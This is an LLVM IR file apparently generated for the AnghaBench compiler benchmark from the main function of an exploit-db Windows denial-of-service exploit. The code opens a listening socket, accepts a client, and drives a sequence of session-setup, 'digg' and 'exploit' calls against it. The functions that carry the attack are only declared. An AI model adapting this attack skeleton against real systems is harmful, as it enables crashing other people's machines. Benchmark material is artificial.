; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1065.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1065.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@INADDR_ANY = common dso_local global i32 0, align 4
@PORT = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [6 x i8] c"\0A%s\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [7 x i8] c"done!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.sockaddr_in, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i64 4919, i64* %9, align 8
  store i64 2056, i64* %10, align 8
  store i64 2056, i64* %11, align 8
  store i64 18262, i64* %12, align 8
  %17 = call i32 @bzero(%struct.sockaddr_in* %16, i32 12)
  %18 = load i32, i32* @AF_INET, align 4
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  store i32 %18, i32* %19, align 4
  %20 = load i32, i32* @INADDR_ANY, align 4
  %21 = call i32 @htonl(i32 %20)
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  %23 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %22, i32 0, i32 0
  store i32 %21, i32* %23, align 4
  %24 = load i32, i32* @PORT, align 4
  %25 = call i32 @htons(i32 %24)
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i32 %25, i32* %26, align 4
  %27 = load i32, i32* @AF_INET, align 4
  %28 = load i32, i32* @SOCK_STREAM, align 4
  %29 = call i32 @socket(i32 %27, i32 %28, i32 0)
  store i32 %29, i32* %6, align 4
  %30 = load i32, i32* %6, align 4
  %31 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %32 = call i32 @bind(i32 %30, %struct.sockaddr* %31, i32 12)
  %33 = load i32, i32* %6, align 4
  %34 = call i32 @listen(i32 %33, i32 1)
  store i32 12, i32* %14, align 4
  %35 = load i32, i32* %6, align 4
  %36 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  %37 = call i32 @accept(i32 %35, %struct.sockaddr* %36, i32* %14)
  store i32 %37, i32* %7, align 4
  %38 = load i32, i32* %6, align 4
  %39 = call i32 @close(i32 %38)
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 0
  %41 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %40, i32 0, i32 0
  %42 = load i32, i32* %41, align 4
  %43 = call i8* @inet_ntoa(i32 %42)
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0), i8* %43)
  %45 = load i32, i32* %7, align 4
  %46 = call i32 @neg(i32 %45)
  %47 = load i32, i32* %7, align 4
  %48 = load i64, i64* %11, align 8
  %49 = load i64, i64* %10, align 8
  %50 = call i32 @sessionsetup(i32 %47, i64 %48, i64 %49, i32 0)
  store i32 0, i32* %8, align 4
  br label %51

51:                                               ; preds = %65, %2
  %52 = load i32, i32* %8, align 4
  %53 = icmp slt i32 %52, 15
  br i1 %53, label %54, label %68

54:                                               ; preds = %51
  %55 = load i32, i32* %7, align 4
  %56 = load i64, i64* %9, align 8
  %57 = load i64, i64* %12, align 8
  %58 = load i64, i64* %11, align 8
  %59 = load i64, i64* %10, align 8
  %60 = call i32 @digg(i32 %55, i64 %56, i64 %57, i64 %58, i64 %59, i32 0)
  %61 = load i64, i64* %9, align 8
  %62 = add i64 %61, 1
  store i64 %62, i64* %9, align 8
  %63 = load i64, i64* %12, align 8
  %64 = add i64 %63, 1
  store i64 %64, i64* %12, align 8
  br label %65

65:                                               ; preds = %54
  %66 = load i32, i32* %8, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %8, align 4
  br label %51

68:                                               ; preds = %51
  %69 = load i32, i32* %7, align 4
  %70 = load i64, i64* %9, align 8
  %71 = load i64, i64* %12, align 8
  %72 = load i64, i64* %11, align 8
  %73 = load i64, i64* %10, align 8
  %74 = call i32 @digg(i32 %69, i64 %70, i64 %71, i64 %72, i64 %73, i32 1)
  %75 = load i64, i64* %9, align 8
  %76 = add i64 %75, 1
  store i64 %76, i64* %9, align 8
  %77 = load i64, i64* %12, align 8
  %78 = add i64 %77, 1
  store i64 %78, i64* %12, align 8
  %79 = load i32, i32* %7, align 4
  %80 = load i64, i64* %9, align 8
  %81 = load i64, i64* %12, align 8
  %82 = load i64, i64* %11, align 8
  %83 = load i64, i64* %10, align 8
  %84 = call i32 @digg(i32 %79, i64 %80, i64 %81, i64 %82, i64 %83, i32 2)
  %85 = load i64, i64* %9, align 8
  %86 = add i64 %85, 1
  store i64 %86, i64* %9, align 8
  %87 = load i64, i64* %12, align 8
  %88 = add i64 %87, 1
  store i64 %88, i64* %12, align 8
  store i32 0, i32* %8, align 4
  br label %89

89:                                               ; preds = %103, %68
  %90 = load i32, i32* %8, align 4
  %91 = icmp slt i32 %90, 4
  br i1 %91, label %92, label %106

92:                                               ; preds = %89
  %93 = load i32, i32* %7, align 4
  %94 = load i64, i64* %9, align 8
  %95 = load i64, i64* %12, align 8
  %96 = load i64, i64* %11, align 8
  %97 = load i64, i64* %10, align 8
  %98 = call i32 @digg(i32 %93, i64 %94, i64 %95, i64 %96, i64 %97, i32 0)
  %99 = load i64, i64* %9, align 8
  %100 = add i64 %99, 1
  store i64 %100, i64* %9, align 8
  %101 = load i64, i64* %12, align 8
  %102 = add i64 %101, 1
  store i64 %102, i64* %12, align 8
  br label %103

103:                                              ; preds = %92
  %104 = load i32, i32* %8, align 4
  %105 = add nsw i32 %104, 1
  store i32 %105, i32* %8, align 4
  br label %89

106:                                              ; preds = %89
  %107 = load i32, i32* %7, align 4
  %108 = load i64, i64* %9, align 8
  %109 = load i64, i64* %12, align 8
  %110 = load i64, i64* %11, align 8
  %111 = load i64, i64* %10, align 8
  %112 = call i32 @digg(i32 %107, i64 %108, i64 %109, i64 %110, i64 %111, i32 3)
  %113 = load i64, i64* %11, align 8
  %114 = add i64 %113, 1
  store i64 %114, i64* %11, align 8
  %115 = load i64, i64* %10, align 8
  %116 = add i64 %115, 1
  store i64 %116, i64* %10, align 8
  %117 = load i32, i32* %7, align 4
  %118 = load i64, i64* %11, align 8
  %119 = load i64, i64* %10, align 8
  %120 = call i32 @sessionsetup(i32 %117, i64 %118, i64 %119, i32 1)
  %121 = load i64, i64* %11, align 8
  %122 = add i64 %121, -1
  store i64 %122, i64* %11, align 8
  %123 = load i64, i64* %10, align 8
  %124 = add i64 %123, -1
  store i64 %124, i64* %10, align 8
  store i32 0, i32* %8, align 4
  br label %125

125:                                              ; preds = %139, %106
  %126 = load i32, i32* %8, align 4
  %127 = icmp slt i32 %126, 2
  br i1 %127, label %128, label %142

128:                                              ; preds = %125
  %129 = load i32, i32* %7, align 4
  %130 = load i64, i64* %9, align 8
  %131 = load i64, i64* %12, align 8
  %132 = load i64, i64* %11, align 8
  %133 = load i64, i64* %10, align 8
  %134 = call i32 @digg(i32 %129, i64 %130, i64 %131, i64 %132, i64 %133, i32 4)
  %135 = load i64, i64* %9, align 8
  %136 = add i64 %135, 1
  store i64 %136, i64* %9, align 8
  %137 = load i64, i64* %12, align 8
  %138 = add i64 %137, 1
  store i64 %138, i64* %12, align 8
  br label %139

139:                                              ; preds = %128
  %140 = load i32, i32* %8, align 4
  %141 = add nsw i32 %140, 1
  store i32 %141, i32* %8, align 4
  br label %125

142:                                              ; preds = %125
  %143 = load i64, i64* %10, align 8
  %144 = add i64 %143, 2
  store i64 %144, i64* %10, align 8
  %145 = load i32, i32* %7, align 4
  %146 = load i64, i64* %9, align 8
  %147 = load i64, i64* %12, align 8
  %148 = load i64, i64* %11, align 8
  %149 = load i64, i64* %10, align 8
  %150 = call i32 @exploit(i32 %145, i64 %146, i64 %147, i64 %148, i64 %149)
  %151 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  %152 = load i32, i32* %7, align 4
  %153 = call i32 @close(i32 %152)
  %154 = load i32, i32* %3, align 4
  ret i32 %154
}

declare dso_local i32 @bzero(%struct.sockaddr_in*, i32) #1

declare dso_local i32 @htonl(i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @listen(i32, i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @inet_ntoa(i32) #1

declare dso_local i32 @neg(i32) #1

declare dso_local i32 @sessionsetup(i32, i64, i64, i32) #1

declare dso_local i32 @digg(i32, i64, i64, i64, i64, i32) #1

declare dso_local i32 @exploit(i32, i64, i64, i64, i64) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
